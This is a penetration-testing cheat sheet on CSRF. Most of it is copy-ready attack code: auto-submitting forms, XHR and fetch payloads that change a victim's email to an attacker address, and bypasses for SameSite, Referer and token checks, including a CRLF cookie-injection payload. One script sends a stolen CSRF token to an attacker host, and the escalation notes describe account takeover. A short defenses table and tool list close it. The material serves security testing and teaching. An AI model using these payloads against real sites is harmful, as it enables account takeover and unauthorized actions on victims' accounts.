# CSRF (Cross-Site Request Forgery)

> **Summary**: Attacker tricks an authenticated user's browser into performing unintended actions on a web application where they are logged in, by forging requests from a malicious site.
> **Impact**: Unauthorized state-changing actions (password change, email change, fund transfer, privilege escalation) performed as the victim.
> **Typical Severity**: Medium | High (depending on the action)

---

## Detection

### Indicators
- State-changing requests rely solely on cookies for authentication (no CSRF token)
- CSRF tokens present but not validated, or validated only when present
- `SameSite` cookie attribute missing or set to `None`
- No `Origin`/`Referer` header validation on sensitive endpoints
- Application accepts GET requests for state-changing operations

### Automated Detection
```
# In Burp Suite: right-click request > Engagement tools > Generate CSRF PoC
# Test the generated PoC in browser while authenticated
```

### Manual Detection
1. Capture a state-changing request (password change, email update, etc.)
2. Remove the CSRF token parameter entirely -- does the request still succeed?
3. Replace the token with an empty value, a random value, or another user's token
4. Change the HTTP method (POST to GET) -- does it still work?
5. Check `SameSite` cookie attribute in `Set-Cookie` headers

---

## Exploitation

### Prerequisites
1. **Relevant action** exists (something worth exploiting -- not just logout)
2. **Cookie-based session handling** (if JWT in headers, CSRF is generally not possible)
3. **No unpredictable request parameters** that the attacker cannot determine or forge

### Step-by-Step

1. **Identify a valuable state-changing endpoint** (change email, password, role, transfer funds)
2. **Analyze the request** in Burp -- note method, parameters, headers, and tokens
3. **Test token removal** -- remove the CSRF token and replay the request
4. **Test method switch** -- change POST to GET with params in query string
5. **Build a PoC** -- create an auto-submitting HTML form or XHR
6. **Deliver to victim** -- host the PoC and trick the victim into visiting it
7. **Verify** -- confirm the action was performed on the victim's account

**Success criteria**: State-changing action performed on victim's account via cross-origin request

### PoC Templates

#### GET-based CSRF (via HTML tags)
```html
<!-- Any of these will trigger a GET request with victim's cookies -->
<img src="https://<TARGET>/account/settings?newEmail=attacker@evil.com" style="display:none">
<iframe src="https://<TARGET>/account/settings?newEmail=attacker@evil.com" style="display:none"></iframe>
<script src="https://<TARGET>/account/settings?newEmail=attacker@evil.com"></script>
```

Other HTML5 tags for auto GET: `<embed>`, `<audio>`, `<video>`, `<source>`, `<link>`, `<object>`, `<body background="">`, `<input type="image" src="">`, `<bgsound>`, `<track>`

#### Form GET Request
```html
<html>
<body>
  <script>history.pushState('', '', '/')</script>
  <form method="GET" action="https://<TARGET>/email/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

#### Form POST Request
```html
<html>
<body>
  <script>history.pushState('', '', '/')</script>
  <form method="POST" action="https://<TARGET>/account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="submit" value="1">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

#### JSON CSRF (via text/plain content type)
```html
<html>
<body>
  <form id="form" method="POST" action="https://<TARGET>/api/update"
        enctype="text/plain">
    <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
  </form>
  <script>document.getElementById('form').submit();</script>
</body>
</html>
```
> The form sends: `{"email":"attacker@evil.com","padding":"="}` which may be parsed as valid JSON.

#### Multipart CSRF
```html
<form method="POST" action="https://<TARGET>/upload" enctype="multipart/form-data">
  <input type="hidden" name="field" value="malicious_value">
  <input type="file" name="file" style="display:none">
</form>
<script>document.forms[0].submit();</script>
```

#### XHR-based CSRF (for simple requests)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://<TARGET>/api/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("email=attacker@evil.com");
</script>
```

#### Fetch-based CSRF
```html
<script>
fetch("https://<TARGET>/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "email=attacker@evil.com"
});
</script>
```

---

## Bypasses

### Token Removal
- Remove the CSRF token parameter entirely from the request
- Some apps only validate the token when the parameter is present
- Also try submitting with an empty value: `csrf=`

### Token Not Tied to Session
- Applications may validate tokens against a global pool instead of per-session
- Get a valid token from your own session and use it in the attack against the victim

### Method Switch (POST to GET)
Some applications only enforce CSRF on POST requests:
```
# Original POST with token
POST /settings HTTP/1.1
email=new@evil.com&csrf_token=abc123

# Bypass: switch to GET (no token needed)
GET /settings?email=new@evil.com HTTP/1.1
```

### Method Override
If the endpoint uses PUT/DELETE/PATCH, try method override:
```html
<!-- Via _method parameter -->
<form method="POST" action="https://<TARGET>/users/delete">
  <input type="hidden" name="_method" value="DELETE">
  <input type="hidden" name="username" value="admin">
</form>
```

Override headers (add to XHR request):
- `X-HTTP-Method: DELETE`
- `X-HTTP-Method-Override: PUT`
- `X-Method-Override: PATCH`

### Content-Type Manipulation
To avoid preflight requests with POST, use allowed content types:
- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

For JSON endpoints, try: `Content-Type: text/plain; application/json` (may bypass preflight while server still parses JSON).

### SameSite Cookie Bypass

| SameSite Value | Behavior | CSRF Impact |
|----------------|----------|-------------|
| `None` | Cookie sent with all cross-site requests | Fully vulnerable |
| `Lax` (default) | Cookie sent on top-level navigation GET requests | GET-based CSRF possible |
| `Strict` | Never sent cross-site | CSRF blocked (but see bypass below) |

**Lax bypasses:**
- GET-based state changes are still vulnerable with `SameSite=Lax`
- Method override: POST action triggered via GET with `_method=POST` param
- Client-side redirects from the same site can carry cookies

**Strict bypass via gadgets:**
- If the same site has an open redirect, use it as a gadget: navigate to the redirect which then hits the target endpoint as a same-site request

### Referer / Origin Header Bypass

**Suppress Referer header:**
```html
<meta name="referrer" content="never">
<!-- or -->
<meta name="referrer" content="no-referrer">
```

**Inject target domain in Referer:**
```html
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>
  // Put the target domain in the query string so it appears in the Referer
  history.pushState('', '', '?https://<TARGET>.com');
  document.forms[0].submit();
</script>
</body>
```

### Custom Header Token Bypass
If the app uses a custom header (e.g., `X-CSRF-Token`) for protection:
- Test the request without the header entirely
- Test with the same header but a different value
- Test with the same header but empty value
- Flash-based or SWF-based techniques may set custom headers cross-origin (legacy)

### CSRF Token via Cookie (Double Submit)
If the app uses double-submit cookies (CSRF token = cookie value):
- If you can set cookies (via CRLF injection, subdomain cookie setting), set a known CSRF cookie and use the same value in the request

```html
<!-- Set cookie via CRLF then submit form -->
<img src="https://<TARGET>/?search=term%0d%0aSet-Cookie:%20csrf=KNOWN_VALUE"
     onerror="document.forms[0].submit();">
<form action="https://<TARGET>/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="KNOWN_VALUE">
</form>
```

### CSRF Token Exfiltration
If you have an [XSS](xss.md) vulnerability or HTML injection:
```javascript
// Extract CSRF token from the page and send it to attacker
var token = document.querySelector('input[name="csrf"]').value;
fetch('https://<ATTACKER>/steal?token=' + token);
```

Also exploitable via Dangling Markup injection when full XSS is not possible.

### HEAD Method Bypass
Some frameworks handle HEAD requests as GET requests but strip the response body. If CSRF is only checked for POST:
```
HEAD /change-email?email=attacker@evil.com HTTP/1.1
```

---

## Escalation
- **Account takeover**: change victim's email to attacker's, then reset password
- **Privilege escalation**: create admin accounts or elevate roles
- **Data modification**: change settings, delete resources, transfer funds
- **Login CSRF**: force victim to authenticate as attacker, then chain with stored XSS
- **Chain with [XSS](xss.md)**: exfiltrate CSRF tokens or bypass all CSRF defenses
- **Chain with [Clickjacking](clickjacking.md)**: trick user into clicking through transparent overlay
- **Chain with [CORS](cors.md)**: CORS misconfiguration enables reading CSRF tokens cross-origin
- See also: [Cookie-Based Attacks](cookie-based-attacks.md)

---

## Common CSRF Defenses

| Defense | How It Works | Common Pitfalls |
|---------|-------------|-----------------|
| CSRF Tokens | Unique per-session token in forms | Not validated, not tied to session, accepted when empty |
| SameSite Cookies | Browser restricts cross-site cookie sending | `Lax` still allows GET CSRF; missing on older browsers |
| Origin/Referer Checks | Validate request origin | Referer can be suppressed; regex matching is bypassable |
| Custom Headers | Require `X-CSRF-Token` or similar | Not checked when absent; Flash/legacy bypass |
| Re-authentication | Require password for sensitive actions | Often not applied to all state-changing endpoints |

---

## Tools

| Tool | Usage |
|------|-------|
| [Burp Suite](https://portswigger.net/) | Generate CSRF PoC: right-click > Engagement tools > Generate CSRF PoC |
| [XSRFProbe](https://github.com/0xInfection/XSRFProbe) | `python xsrfprobe.py -u <URL>` - CSRF vulnerability audit |
| [Bolt](https://github.com/s0md3v/Bolt) | CSRF scanning tool |
| Browser DevTools | Inspect `Set-Cookie` headers for `SameSite` attribute |

---

## References

| URL | Description |
|-----|-------------|
| [HackTricks CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery) | Comprehensive CSRF methodology |
| [PortSwigger CSRF](https://portswigger.net/web-security/csrf) | CSRF labs and learning |
| [What is CSRF](https://kernelpanic.cryptid.fr/en/blog/nonsense-mayhem-samesite-cors-and-csrf) | SameSite, CORS, and CSRF explained (Part 1) |
| [Why CORS makes CSRF impossible](https://kernelpanic.cryptid.fr/en/blog/nonsense-mayhem-samesite-cors-and-csrf-part-2) | CORS/CSRF relationship (Part 2) |
| [PayloadsAllTheThings CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection) | Payload repository |
| [CSRF PoC Collection](https://pentestbook.six2dez.com/enumeration/web/csrf) | Various CSRF PoC templates |
| [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | Defense guidance |
